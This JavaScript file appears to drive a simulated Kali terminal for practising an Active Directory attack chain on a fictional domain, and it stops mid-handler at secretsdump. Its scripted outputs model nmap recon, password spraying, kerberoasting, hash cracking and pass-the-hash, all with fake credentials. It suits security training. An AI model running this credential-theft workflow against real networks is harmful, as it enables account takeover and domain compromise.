'use strict';

// ── Simulation state ──────────────────────────────────────────────────────────
const SIM = {
  cwd: '/home/kali',
  user: 'kali',          // 'kali' or 'root'
  windowsShell: false,
  hashesOnDisk: false,
  files: {
    '/home/kali/notes.txt': `# Notes - DO NOT SHARE
# Found on workstation WS01 during initial recon
# ---
john.doe:Password1!
# TODO: rotate these after project ends`,
    '/root/notes.txt': `# Notes - DO NOT SHARE
# Found on workstation WS01 during initial recon
# ---
john.doe:Password1!
# TODO: rotate these after project ends`,
    '/home/kali/.bash_history': `sudo nmap -sn 10.10.10.0/24\nsudo nmap -sV -sC -p- 10.10.10.10\nenum4linux -a 10.10.10.10`,
    '/etc/hosts': `127.0.0.1   localhost\n10.10.10.5  kali\n10.10.10.10 DC01.CORP.LOCAL`,
    '/etc/passwd': `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash`,
    '/etc/os-release': `PRETTY_NAME="Kali GNU/Linux Rolling"\nNAME="Kali GNU/Linux"\nID=kali\nID_LIKE=debian\nVERSION="2024.2"\nHOME_URL="https://www.kali.org/"`,
  },
};

function simFiles() {
  const home = SIM.user === 'root' ? '/root' : '/home/kali';
  const f = { ...SIM.files };
  if (SIM.hashesOnDisk) {
    f[home + '/hashes.kerberoast'] = KRB5_HASHES;
    f['/home/kali/hashes.kerberoast'] = KRB5_HASHES;
    f['/root/hashes.kerberoast'] = KRB5_HASHES;
  }
  return f;
}

function isRoot() { return SIM.user === 'root'; }

const KRB5_HASHES = `$krb5tgs$23$*svc_backup$CORP.LOCAL$backup/dc01.corp.local*$8a3f2b1c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f$1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/dc01.corp.local:1433*$9b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6$2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e
$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/web.corp.local*$7c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7$3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f`;

// ── Command outputs ───────────────────────────────────────────────────────────
// Each handler: { id, match(cmd), output, lines[] (alt to output), event, after() }

const HANDLERS = [

  // ── sudo <editor> — skip password, just refuse ───────────────────────────
  {
    match: c => /^sudo\s+(nano|vim?|gedit|emacs|micro)\b/.test(c),
    lines: [{ t: (c) => `${c.replace(/^sudo\s+/, '').split(' ')[0]}: interactive editors not supported in this simulation`, cls: 'y' }],
  },

  // ── sudo (bare) ───────────────────────────────────────────────────────────
  {
    match: c => /^sudo\s*$/.test(c),
    lines: [{ t: 'usage: sudo [-ABknS] [-g group] [-H] [-p prompt] [-u user] [-i|-s] [command]', cls: 'r' }],
  },

  // ── sudo ─────────────────────────────────────────────────────────────────
  {
    match: c => /^sudo\s+./.test(c),
    waitSudo: true,
    lines: [],
  },

  // ── sudo -i / sudo su (become root permanently) ───────────────────────────
  // These are called by runAsSudo() after auth, not directly
  {
    id: 'become-root',
    match: c => c === '-i' || c === 'su' || c === 'su -' || c === '-s /bin/bash',
    lines: [],   // prompt change only
    after: (c) => { SIM.user = 'root'; if (c === '-i' || c === 'su -') SIM.cwd = '/root'; },
  },

  // ── apt / apt-get ─────────────────────────────────────────────────────────
  {
    match: c => /^apt(-get)?\s+update/.test(c),
    loadTime: 3500,
    lines: [
      { t: 'Hit:1 http://http.kali.org/kali kali-rolling InRelease', cls: 'b' },
      { t: 'Get:2 http://http.kali.org/kali kali-rolling/main amd64 Packages [19.1 MB]' },
      { t: 'Get:3 http://http.kali.org/kali kali-rolling/contrib amd64 Packages [98.8 kB]' },
      { t: 'Get:4 http://http.kali.org/kali kali-rolling/non-free amd64 Packages [149 kB]' },
      { t: 'Get:5 http://http.kali.org/kali kali-rolling/non-free-firmware amd64 Packages [9,660 B]' },
      { t: 'Fetched 19.4 MB in 8s (2,425 kB/s)' },
      { t: 'Reading package lists... Done', cls: 'g' },
    ],
    requireRoot: true,
  },
  {
    match: c => /^apt(-get)?\s+install/.test(c),
    loadTime: 2000,
    lines: [
      { t: 'Reading package lists... Done' },
      { t: 'Building dependency tree... Done' },
      { t: 'Reading state information... Done' },
      { t: (c) => {
        const pkg = c.replace(/^apt(-get)?\s+install\s+(-y\s+)?/, '').trim() || 'package';
        return `${pkg} is already the newest version.`;
      }, cls: 'g' },
      { t: '0 upgraded, 0 newly installed, 0 to remove and 127 not upgraded.' },
    ],
    requireRoot: true,
  },
  {
    match: c => /^apt(-get)?\s+upgrade/.test(c),
    lines: [
      { t: 'Reading package lists... Done' },
      { t: 'Building dependency tree... Done' },
      { t: 'Calculating upgrade... Done' },
      { t: '0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.' },
    ],
    requireRoot: true,
  },
  {
    match: c => /^apt(-get)?\b/.test(c),
    lines: [{ t: (c) => `E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)\nE: Unable to acquire the dpkg frontend lock, are you root?`, cls: 'r' }],
  },

  // ── Basic system ──────────────────────────────────────────────────────────
  {
    match: c => c === 'whoami',
    lines: [{ t: () => SIM.user }],
  },
  {
    match: c => c === 'id',
    lines: [{ t: () => isRoot()
      ? 'uid=0(root) gid=0(root) groups=0(root)'
      : 'uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),142(kaboxer)' }],
  },
  {
    match: c => c === 'hostname',
    lines: [{ t: 'kali' }],
  },
  {
    match: c => c.startsWith('uname'),
    lines: [{ t: 'Linux kali 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 GNU/Linux' }],
  },
  {
    match: c => c === 'pwd',
    lines: [{ t: () => SIM.cwd }],
  },
  {
    match: c => c === 'date',
    lines: [{ t: () => new Date().toString() }],
  },
  {
    match: c => c === 'uptime',
    lines: [{ t: ' 14:23:01 up 2:11,  1 user,  load average: 0.12, 0.08, 0.05' }],
  },
  {
    match: c => c === 'env' || c === 'printenv',
    lines: [
      { t: 'SHELL=/bin/bash' },
      { t: () => `USER=${SIM.user}` },
      { t: () => `HOME=${SIM.user === 'root' ? '/root' : '/home/kali'}` },
      { t: 'TERM=xterm-256color' },
      { t: 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' },
      { t: 'LANG=en_US.UTF-8' },
    ],
  },
  {
    match: c => c === 'history',
    lines: [
      { t: '    1  sudo nmap -sn 10.10.10.0/24' },
      { t: '    2  sudo nmap -sV -sC 10.10.10.10' },
      { t: '    3  enum4linux -a 10.10.10.10' },
      { t: '    4  cat /home/kali/notes.txt' },
    ],
  },

  // ── ls ────────────────────────────────────────────────────────────────────
  {
    match: c => /^ls(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      const showHidden = cmd.includes('-a') || cmd.includes('-la') || cmd.includes('-al');
      const longFmt    = cmd.includes('-l') || cmd.includes('-la') || cmd.includes('-al');
      const home = SIM.user === 'root' ? '/root' : '/home/kali';
      const cwd  = SIM.cwd;

      // dirs: set of names that are directories
      let dirs    = new Set();
      let files   = [];
      let dotDirs = [];
      let dotFiles = [];

      if (cwd === '/home/kali') {
        dirs  = new Set(['Desktop','Documents','Downloads','Music','Pictures','Public','Templates','Videos']);
        files = ['notes.txt'];
        if (SIM.hashesOnDisk) files.push('hashes.kerberoast');
        dotDirs  = ['.config', '.local'];
        dotFiles = ['.bash_history', '.bash_logout', '.bashrc', '.profile'];
      } else if (cwd === '/root') {
        dirs     = new Set([]);
        files    = ['notes.txt'];
        if (SIM.hashesOnDisk) files.push('hashes.kerberoast');
        dotDirs  = ['.config'];
        dotFiles = ['.bash_history', '.bashrc', '.profile'];
      } else if (cwd === '/') {
        dirs  = new Set(['bin','boot','dev','etc','home','lib','lib64','media','mnt','opt','proc','root','run','sbin','srv','sys','tmp','usr','var']);
        files = [];
      } else if (cwd === '/etc') {
        dirs  = new Set(['apt','cron.d','default','init.d','network','ssl','systemd']);
        files = ['bash.bashrc','hostname','hosts','issue','os-release','passwd','profile','shadow','shells','sudoers'];
      } else if (cwd === '/usr/share/wordlists') {
        dirs  = new Set(['dirb','dirbuster','metasploit','nmap','wfuzz']);
        files = ['fasttrack.txt','rockyou.txt'];
      } else if (cwd === '/home') {
        dirs  = new Set(['kali']);
        files = [];
      } else if (cwd === '/home/kali/Desktop' || cwd === '/home/kali/Documents' ||
                 cwd === '/home/kali/Downloads' || cwd === '/home/kali/Music' ||
                 cwd === '/home/kali/Pictures' || cwd === '/home/kali/Public' ||
                 cwd === '/home/kali/Templates' || cwd === '/home/kali/Videos') {
        dirs = new Set([]); files = [];
      } else if (cwd === '/tmp') {
        dirs  = new Set([]);
        files = [];
        dotFiles = ['.font-unix', '.ICE-unix', '.X11-unix'];
      } else if (cwd.startsWith('/usr/share')) {
        dirs = new Set(['applications','doc','fonts','icons','man','metasploit-framework','wordlists']);
        files = [];
      } else if (cwd.startsWith('/var')) {
        dirs  = new Set(['backups','cache','lib','lock','log','mail','opt','run','spool','tmp']);
        files = [];
      } else {
        dirs = new Set([]); files = [];
      }

      // Build display list
      const allDirs  = [...dirs].sort();
      const allFiles = [...files].sort();
      let entries = [...allDirs, ...allFiles];
      let dotEntries = [...dotDirs.sort(), ...dotFiles.sort()];

      if (!longFmt) {
        let out = [];
        if (showHidden) out.push('. ', '.. ', ...dotEntries.map(e => e + (dotDirs.includes(e) ? '/' : '')));
        out.push(...allDirs.map(d => d + '/'), ...allFiles);
        // remove trailing slashes for display and colour dirs — just return plain for simplicity
        return out.map(e => e.replace(/\/$/, '')).join('  ') || '';
      }

      // Long format
      const now = 'Jan 15 14:23';
      const owner = SIM.user;
      const fmt = (name, isDir, sz, perm) => {
        const p = perm || (isDir ? 'drwxr-xr-x' : '-rw-r--r--');
        const s = String(sz || (isDir ? 4096 : 248)).padStart(8);
        return `${p}  1 ${owner} ${owner} ${s} ${now} ${name}`;
      };

      const lines = [];
      if (showHidden) {
        lines.push(fmt('.', true, 4096, 'drwxr-xr-x'));
        lines.push(fmt('..', true, 4096, 'drwxr-xr-x'));
        dotDirs.forEach(d  => lines.push(fmt(d, true)));
        dotFiles.forEach(f => lines.push(fmt(f, false, f === '.bash_history' ? 1423 : 220, '-rw-------')));
      }
      allDirs.forEach(d  => lines.push(fmt(d, true)));
      allFiles.forEach(f => {
        const sz = f.endsWith('.kerberoast') ? 3241 : f === 'rockyou.txt' ? 139921507 : 248;
        lines.push(fmt(f, false, sz));
      });
      return lines.join('\n') || '';
    }}],
  },

  // ── cat ───────────────────────────────────────────────────────────────────
  {
    match: c => /^cat\s/.test(c),
    lines: [{ t: (cmd) => {
      const arg = cmd.replace(/^cat\s+/, '').trim();
      const abs = arg.startsWith('/') ? arg : SIM.cwd.replace(/\/?$/, '/') + arg;
      const files = simFiles();
      // Try exact, then with /root/ prefix
      const content = files[abs] || files['/root/' + arg] || files[arg];
      if (content !== undefined) return content;
      return `cat: ${arg}: No such file or directory`;
    }, cls: (cmd) => {
      const arg = cmd.replace(/^cat\s+/, '').trim();
      const files = simFiles();
      const abs = arg.startsWith('/') ? arg : SIM.cwd.replace(/\/?$/, '/') + arg;
      return (files[abs] || files['/root/'+arg] || files[arg]) !== undefined ? '' : 'r';
    }}],
    event: (cmd) => cmd.includes('notes') ? 'cat-notes' : null,
  },

  // ── cd ────────────────────────────────────────────────────────────────────
  {
    match: c => /^cd(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      const home = SIM.user === 'root' ? '/root' : '/home/kali';
      let arg = cmd.replace(/^cd\s*/, '').trim() || home;
      // Expand tilde
      if (arg === '~') arg = home;
      else if (arg.startsWith('~/')) arg = home + arg.slice(1);
      // Strip trailing slash unless it's the root itself
      if (arg !== '/') arg = arg.replace(/\/+$/, '');
      if (!arg || arg === home) SIM.cwd = home;
      else if (arg === '..') SIM.cwd = SIM.cwd.split('/').slice(0, -1).join('/') || '/';
      else if (arg === '-') SIM.cwd = home;
      else if (arg.startsWith('/')) SIM.cwd = arg;
      else SIM.cwd = (SIM.cwd === '/' ? '' : SIM.cwd) + '/' + arg;
      return '';
    }}],
  },

  // ── mkdir / touch / rm ────────────────────────────────────────────────────
  {
    match: c => /^(mkdir|touch|rm|cp|mv|chmod)\s/.test(c),
    lines: [{ t: '' }],
  },

  // ── Network ───────────────────────────────────────────────────────────────
  {
    match: c => c === 'ip a' || c === 'ip addr' || c === 'ifconfig',
    lines: [
      { t: 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500' },
      { t: '        inet 10.10.10.5  netmask 255.255.255.0  broadcast 10.10.10.255' },
      { t: '        inet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>' },
      { t: '        ether 08:00:27:4e:66:a1  txqueuelen 1000  (Ethernet)' },
      { t: '        RX packets 4821  bytes 892145 (871.2 KiB)' },
      { t: '        TX packets 3012  bytes 441092 (430.7 KiB)' },
      { t: '' },
      { t: 'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536' },
      { t: '        inet 127.0.0.1  netmask 255.0.0.0' },
    ],
  },
  {
    match: c => c.startsWith('ping'),
    lines: [
      { t: (c) => `PING ${c.split(' ').pop()} 56(84) bytes of data.` },
      { t: (c) => `64 bytes from ${c.split(' ').pop()}: icmp_seq=1 ttl=128 time=1.23 ms` },
      { t: (c) => `64 bytes from ${c.split(' ').pop()}: icmp_seq=2 ttl=128 time=0.98 ms` },
      { t: (c) => `64 bytes from ${c.split(' ').pop()}: icmp_seq=3 ttl=128 time=1.05 ms` },
      { t: '^C' },
      { t: (c) => `--- ${c.split(' ').pop()} ping statistics ---` },
      { t: '3 packets transmitted, 3 received, 0% packet loss' },
    ],
  },

  // ── NMAP ─────────────────────────────────────────────────────────────────
  {
    id: 'nmap-discovery',
    loadTime: 2410,
    progressFn: (elapsed, total) => {
      const pct = Math.min(99.9, elapsed / total * 100).toFixed(1);
      const remMs = Math.max(0, total - elapsed);
      const remS = (remMs / 1000).toFixed(0);
      return [
        { t: `Stats: 0:${String(Math.floor(elapsed/1000)).padStart(2,'0')} elapsed; 0 hosts completed (0 up), 256 undergoing Ping Scan`, cls: 'd' },
        { t: `Ping Scan Timing: About ${pct}% done; ETC: --:-- (0:${remS.padStart(2,'0')} remaining)`, cls: 'd' },
      ];
    },
    match: c => /^nmap\b/.test(c) && (c.includes('/24') || c.includes('-sn')),
    lines: [
      { t: 'Starting Nmap 7.94 ( https://nmap.org ) at ' + new Date().toUTCString().slice(0,16) },
      { t: '' },
      { t: 'Nmap scan report for 10.10.10.1', cls: 'b' },
      { t: 'Host is up (0.00080s latency).' },
      { t: '' },
      { t: 'Nmap scan report for 10.10.10.5', cls: 'b' },
      { t: 'Host is up (0.000082s latency).' },
      { t: '' },
      { t: 'Nmap scan report for DC01.CORP.LOCAL (10.10.10.10)', cls: 'b' },
      { t: 'Host is up (0.0015s latency).' },
      { t: '' },
      { t: 'Nmap done: 256 IP addresses (3 hosts up) scanned in 2.41 seconds', cls: 'g' },
    ],
  },
  {
    id: 'nmap-full',
    loadTime: 14000,
    progressFn: (elapsed, total) => {
      const elSec  = Math.floor(elapsed / 1000);
      const elMin  = Math.floor(elSec / 60);
      const elRemS = elSec % 60;
      const pct    = Math.min(99.99, elapsed / total * 100).toFixed(2);
      const remMs  = Math.max(0, total - elapsed);
      const remSec = Math.floor(remMs / 1000);
      const remMin = Math.floor(remSec / 60);
      const remRemS = remSec % 60;
      const etc   = new Date(Date.now() + remMs);
      const etcStr = `${String(etc.getHours()).padStart(2,'0')}:${String(etc.getMinutes()).padStart(2,'0')}`;
      return [
        { t: `Stats: ${elMin}:${String(elRemS).padStart(2,'0')} elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan`, cls: 'd' },
        { t: `SYN Stealth Scan Timing: About ${pct}% done; ETC: ${etcStr} (${remMin}:${String(remRemS).padStart(2,'0')} remaining)`, cls: 'd' },
      ];
    },
    match: c => /^nmap\b/.test(c) && c.includes('10.10.10.10'),
    lines: [
      { t: 'Starting Nmap 7.94 ( https://nmap.org ) at ' + new Date().toUTCString().slice(0,16) },
      { t: 'Nmap scan report for DC01.CORP.LOCAL (10.10.10.10)' },
      { t: 'Host is up (0.0015s latency).' },
      { t: 'Not shown: 65514 filtered tcp ports (no-response)' },
      { t: 'PORT      STATE SERVICE       VERSION' },
      { t: '53/tcp    open  domain        Simple DNS Plus', cls: 'g' },
      { t: '80/tcp    open  http          Microsoft IIS httpd 10.0', cls: 'g' },
      { t: '88/tcp    open  kerberos-sec  Microsoft Windows Kerberos', cls: 'g' },
      { t: '135/tcp   open  msrpc         Microsoft Windows RPC', cls: 'g' },
      { t: '139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn', cls: 'g' },
      { t: '389/tcp   open  ldap          Microsoft Windows Active Directory LDAP', cls: 'g' },
      { t: '445/tcp   open  microsoft-ds?', cls: 'g' },
      { t: '464/tcp   open  kpasswd5?', cls: 'g' },
      { t: '593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0', cls: 'g' },
      { t: '636/tcp   open  ldapssl?', cls: 'g' },
      { t: '3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP', cls: 'g' },
      { t: '5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)', cls: 'g' },
      { t: '' },
      { t: 'Host script results:' },
      { t: '| smb2-security-mode:' },
      { t: '|   3:1:1:' },
      { t: '|_    Message signing enabled and required' },
      { t: '| smb2-time:' },
      { t: '|   date: 2024-01-15T14:11:47' },
      { t: '' },
      { t: 'Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows' },
      { t: '' },
      { t: 'Nmap done: 1 IP address (1 host up) scanned in 127.34 seconds', cls: 'g' },
    ],
  },

  // ── enum4linux ────────────────────────────────────────────────────────────
  {
    id: 'enum4linux',
    loadTime: 5000,
    match: c => /^enum4linux\b/.test(c) && c.includes('10.10.10.10'),
    lines: [
      { t: 'Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ )', cls: 'b' },
      { t: '' },
      { t: ' ========================== Target Information ==========================' },
      { t: ' Target ........... 10.10.10.10' },
      { t: ' RID Range ........ 500-550,1000-' },
      { t: ' Username ......... \'\'' },
      { t: '' },
      { t: ' ======================== Workgroup/Domain =========================' },
      { t: '[+] Got domain/workgroup name: CORP', cls: 'g' },
      { t: '' },
      { t: ' ======================== OS information =========================' },
      { t: '[+] Got OS info for 10.10.10.10 from smbclient: Domain=[CORP] OS=[Windows Server 2019 Standard 17763] Server=[Windows Server 2019 Standard 6.3]', cls: 'g' },
      { t: '' },
      { t: ' ======================== Users =========================' },
      { t: '[+] Got userlist with 7 members', cls: 'g' },
      { t: 'index: 0x1 RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: Administrator', cls: 'g' },
      { t: 'index: 0x2 RID: 0x1f5 acb: 0x00000215 Account: Guest          Name: Guest', cls: 'd' },
      { t: 'index: 0x3 RID: 0x1f6 acb: 0x00000011 Account: krbtgt         Name: krbtgt', cls: 'd' },
      { t: 'index: 0x4 RID: 0x44f acb: 0x00000210 Account: john.doe       Name: John Doe', cls: 'g' },
      { t: 'index: 0x5 RID: 0x450 acb: 0x00000210 Account: svc_backup     Name: Backup Service', cls: 'g' },
      { t: 'index: 0x6 RID: 0x451 acb: 0x00000210 Account: svc_sql        Name: SQL Service', cls: 'g' },
      { t: 'index: 0x7 RID: 0x452 acb: 0x00000210 Account: svc_web        Name: Web Service', cls: 'g' },
      { t: '' },
      { t: ' ======================== Share Enumeration =========================' },
      { t: '\tSharename       Type      Comment' },
      { t: '\t---------       ----      -------' },
      { t: '\tSYSVOL          Disk      Logon server share', cls: 'b' },
      { t: '\tNETLOGON        Disk      Logon server share', cls: 'b' },
      { t: '\tIPC$            IPC       Remote IPC', cls: 'd' },
      { t: '' },
      { t: ' ======================== Password Policy Information =========================' },
      { t: '[+] Minimum password length: 7', cls: 'g' },
      { t: '[+] Password history length: 24', cls: 'g' },
      { t: '[+] Maximum password age: 41 days', cls: 'g' },
      { t: '[+] Account lockout threshold: 5', cls: 'g' },
      { t: '' },
      { t: 'enum4linux complete on ' + new Date().toUTCString().slice(0,16), cls: 'g' },
    ],
  },

  // ── CrackMapExec — john.doe ───────────────────────────────────────────────
  {
    id: 'cme-johndoe',
    loadTime: 1400,
    match: c => /^crackmapexec\b/.test(c) && c.includes('john.doe') && (c.includes('Password1') || c.includes("'Password1!'")),
    lines: [
      { t: 'SMB         10.10.10.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)' },
      { t: 'SMB         10.10.10.10     445    DC01             [+] CORP.LOCAL\\john.doe:Password1!', cls: 'g' },
    ],
  },

  // ── CrackMapExec — svc_backup ─────────────────────────────────────────────
  {
    id: 'cme-svcbackup',
    loadTime: 1400,
    match: c => /^crackmapexec\b/.test(c) && c.includes('svc_backup') && c.includes('Backup2023'),
    lines: [
      { t: 'SMB         10.10.10.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)' },
      { t: 'SMB         10.10.10.10     445    DC01             [+] CORP.LOCAL\\svc_backup:Backup2023! (Backup Operators)', cls: 'g' },
    ],
  },

  // ── CrackMapExec — Pass-the-Hash ─────────────────────────────────────────
  {
    id: 'cme-pth',
    loadTime: 1400,
    match: c => /^crackmapexec\b/.test(c) && c.includes('Administrator') && c.includes('-H') && c.includes('fc525c'),
    lines: [
      { t: 'SMB         10.10.10.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)' },
      { t: 'SMB         10.10.10.10     445    DC01             [+] CORP.LOCAL\\Administrator:fc525c9683e8fe067095ba2ddc971889 (Pwn3d!)', cls: 'g' },
    ],
  },

  // ── CrackMapExec — bad creds ─────────────────────────────────────────────
  {
    loadTime: 1000,
    match: c => /^crackmapexec\b/.test(c),
    lines: [
      { t: (c) => 'SMB         10.10.10.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)' },
      { t: (c) => 'SMB         10.10.10.10     445    DC01             [-] Authentication failed', cls: 'r' },
    ],
  },

  // ── GetUserSPNs — enumerate (no -request) ────────────────────────────────
  {
    id: 'spns-enum',
    loadTime: 2500,
    match: c => /impacket-GetUserSPNs|GetUserSPNs/.test(c) && c.includes('10.10.10.10') && !c.includes('-request'),
    lines: [
      { t: 'Impacket v0.11.0 - Copyright 2023 Fortra' },
      { t: '' },
      { t: 'ServicePrincipalName          Name        MemberOf  PasswordLastSet              LastLogon' },
      { t: '----------------------------  ----------  --------  ---------------------------  ---------------------------' },
      { t: 'backup/dc01.corp.local        svc_backup            2024-01-10 09:15:43.000000   2024-01-14 18:32:17.000000', cls: 'g' },
      { t: 'MSSQLSvc/dc01.corp.local:1433 svc_sql               2024-01-08 11:22:01.000000   2024-01-13 09:45:22.000000', cls: 'g' },
      { t: 'HTTP/web.corp.local           svc_web               2024-01-05 14:30:15.000000   2024-01-12 16:20:08.000000', cls: 'g' },
    ],
  },

  // ── GetUserSPNs — request TGS tickets ────────────────────────────────────
  {
    id: 'spns-request',
    loadTime: 3500,
    match: c => /impacket-GetUserSPNs|GetUserSPNs/.test(c) && c.includes('10.10.10.10') && c.includes('-request'),
    lines: [
      { t: 'Impacket v0.11.0 - Copyright 2023 Fortra' },
      { t: '' },
      { t: 'ServicePrincipalName          Name        MemberOf  PasswordLastSet              LastLogon' },
      { t: '----------------------------  ----------  --------  ---------------------------  ---------------------------' },
      { t: 'backup/dc01.corp.local        svc_backup            2024-01-10 09:15:43.000000   2024-01-14 18:32:17.000000', cls: 'g' },
      { t: 'MSSQLSvc/dc01.corp.local:1433 svc_sql               2024-01-08 11:22:01.000000   2024-01-13 09:45:22.000000', cls: 'g' },
      { t: 'HTTP/web.corp.local           svc_web               2024-01-05 14:30:15.000000   2024-01-12 16:20:08.000000', cls: 'g' },
      { t: '' },
      { t: '$krb5tgs$23$*svc_backup$CORP.LOCAL$backup/dc01.corp.local*$8a3f2b1c...', cls: 'y' },
      { t: '$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/dc01.corp.local:1433*$9b4c3d2e...', cls: 'y' },
      { t: '$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/web.corp.local*$7c5d4e3f...', cls: 'y' },
      { t: '' },
      { t: (c) => c.includes('-outputfile') ? '[*] Saving 3 tickets to hashes.kerberoast' : '' , cls: 'b' },
    ],
    after: (c) => { if (c.includes('-outputfile') || c.includes('hashes.kerberoast')) SIM.hashesOnDisk = true; },
  },

  // ── john — crack ──────────────────────────────────────────────────────────
  {
    id: 'john-crack',
    loadTime: 6000,
    match: c => /^john\b/.test(c) && c.includes('hashes') && !c.includes('--show'),
    lines: [
      { t: 'Using default input encoding: UTF-8' },
      { t: 'Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])' },
      { t: 'Will run 4 OpenMP threads' },
      { t: 'Press \'q\' or Ctrl-C to abort, almost any other key for status' },
      { t: '' },
      { t: 'Backup2023!      (svc_backup)', cls: 'g' },
      { t: 'SqlServer1!      (svc_sql)', cls: 'g' },
      { t: 'Welcome123       (svc_web)', cls: 'g' },
      { t: '' },
      { t: '3g 0:00:00:23 DONE (2024-01-15 14:18) 0.1298g/s 1865p/s 5595c/s', cls: 'd' },
      { t: 'Use the "--show" option to display all of the cracked passwords reliably', cls: 'd' },
      { t: 'Session completed.', cls: 'g' },
    ],
  },

  // ── john --show ───────────────────────────────────────────────────────────
  {
    match: c => /^john\b/.test(c) && c.includes('--show'),
    lines: [
      { t: 'svc_backup:Backup2023!:CORP.LOCAL:backup/dc01.corp.local:$krb5tgs$23$*svc_backup$...', cls: 'g' },
      { t: 'svc_sql:SqlServer1!:CORP.LOCAL:MSSQLSvc/dc01.corp.local:1433:$krb5tgs$23$*svc_sql$...', cls: 'g' },
      { t: 'svc_web:Welcome123:CORP.LOCAL:HTTP/web.corp.local:$krb5tgs$23$*svc_web$...', cls: 'g' },
      { t: '' },
      { t: '3 password hashes cracked, 0 left' },
    ],
  },

  // ── hashcat ───────────────────────────────────────────────────────────────
  {
    id: 'hashcat',
    loadTime: 5000,
    match: c => /^hashcat\b/.test(c) && c.includes('13100'),
    lines: [
      { t: 'hashcat (v6.2.6) starting...' },
      { t: '' },
      { t: 'OpenCL API (OpenCL 3.0 LINUX) - Platform #1 [Intel(R) Corporation]' },
      { t: '* Device #1: AMD Radeon RX 6800 XT, 16256/16368 MB (4092 MB allocatable), 36MCU' },
      { t: '' },
      { t: 'Minimum password length supported by kernel: 0', cls: 'd' },
      { t: 'Maximum password length supported by kernel: 256', cls: 'd' },
      { t: '' },
      { t: 'Hashes: 3 digests; 3 unique digests, 3 unique salts' },
      { t: 'Bitmaps: 16 bits, 65536 entries' },
      { t: 'Applicable optimizers applied:' },
      { t: '* Zero-Byte, Not-Iterated, Single-Version' },
      { t: '' },
      { t: 'ATTENTION! Pure (unoptimized) backend kernels selected.', cls: 'y' },
      { t: '' },
      { t: '$krb5tgs$23$*svc_backup$...:Backup2023!', cls: 'g' },
      { t: '$krb5tgs$23$*svc_sql$...:SqlServer1!', cls: 'g' },
      { t: '$krb5tgs$23$*svc_web$...:Welcome123', cls: 'g' },
      { t: '' },
      { t: 'Session..........: hashcat' },
      { t: 'Status...........: Cracked', cls: 'g' },
      { t: 'Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)' },
      { t: 'Time.Started.....: Mon Jan 15 14:18:04 2024 (22 secs)' },
      { t: 'Speed.#1.........:  3,482.2 kH/s (1.48ms) @ Accel:512 Loops:1 Thr:32 Vec:4' },
      { t: 'Recovered........: 3/3 (100.00%) Digests (total), 3/3 (100.00%) Digests (new)' },
      { t: 'Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)' },
      { t: '' },
      { t: 'Started: Mon Jan 15 14:18:04 2024', cls: 'd' },
      { t: 'Stopped: Mon Jan 15 14:18:26 2024', cls: 'd' },
    ],
  },

  // ── secretsdump ───────────────────────────────────────────────────────────
  {
    id: 'secretsdump',
    loadTime: 4000,
    match: c => /impacket-secretsdump|secretsdump/.test(c) && c.includes('10.10.10.10'),
    lines: [
